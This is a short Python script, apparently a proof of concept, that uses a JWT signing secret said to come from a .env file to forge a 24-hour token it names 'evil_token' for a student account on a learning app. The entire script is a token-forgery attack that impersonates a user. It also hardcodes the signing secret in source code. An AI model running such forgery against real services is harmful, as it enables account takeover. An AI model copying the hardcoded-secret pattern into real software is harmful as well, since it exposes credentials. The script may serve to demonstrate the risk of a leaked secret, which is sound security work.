from jose import jwt
import datetime

# This is your actual secret from .env
REAL_SECRET = "h8K#mP2$nQ9vL5@wX3rT7yZ1uA6jB4cD"

expire = datetime.datetime.utcnow() + datetime.timedelta(hours=24)
evil_token = jwt.encode(
    {"sub": "student@cybersabi.app", "exp": expire},
    REAL_SECRET,
    algorithm="HS256"
)
print(evil_token)